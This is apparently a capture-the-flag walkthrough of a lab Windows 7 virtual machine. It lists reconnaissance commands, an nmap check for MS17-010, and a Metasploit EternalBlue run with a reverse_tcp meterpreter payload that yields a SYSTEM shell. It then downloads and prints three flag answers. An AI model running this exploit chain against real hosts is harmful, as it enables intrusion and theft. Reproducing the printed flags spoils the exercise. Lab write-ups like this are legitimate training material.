[Download Link](https://drive.google.com/open?id=11f_wsW59Dh1fGvQCNUPK70lIWzlcg44_)

finding the ip
```
sudo arp-scan-l
```

nmap all ports scan:
```
nmap -sV -O -T4 -p- --min-rate=10000 $ip
```
output:
```zsh
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:36:01:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
```
this is a windows machine

used `smbclient` to list shares - failed
used `enum4linux` for detailed SMB and user enumeration - failed
used `rpcclient` to enumerate users and groups - failed

tried anonymous SMB login with `crackmapexec`
``` 
crackmapexec smb $ip -u '' -p ''
```
output:
```zsh
SMB         10.170.71.142   445    JON-PC           [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:JON-PC) (domain:Jon-PC) (signing:False) (SMBv1:True)
SMB         10.170.71.142   445    JON-PC           [+] Jon-PC\: 
```
got the pc name as `Jon`

Test for MS17-010 (EternalBlue) vulnerability
```
nmap --script smb-vuln-ms17-010 -p445 $ip
```
output
```zsh
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 08:00:27:36:01:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
```
saw that its vulnerable

exploit using metasploit
```
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOST 10.170.71.142
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.170.71.2
show options #all set
run
```
got the meterpreter shell

gathering system informations:
```
sysinfo
```
output
```meterpreter
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
```

```
getuid
```
output
```meterpreter
Server username: NT AUTHORITY\SYSTEM
```

searching for flags
```
meterpreter > search -f "*flag*"
```
output
```meterpreter
c:\Users\Jon\Documents\flag3.txt                                 
c:\Windows\System32\config\flag2.txt                            
c:\flag1.txt                                                   
```

downloaded all these flags
```
meterpreter > download C:\\flag1.txt
meterpreter > download C:\\Windows\\System32\\config\\flag2.txt
meterpreter > download C:\\Users\\Jon\\Documents\\flag3.txt
```

read the flags:
```
cat flag*
```
output
```zsh
flag{access_the_machine}
flag{sam_database_elevated_access}
flag{admin_documents_can_be_valuable} 
```
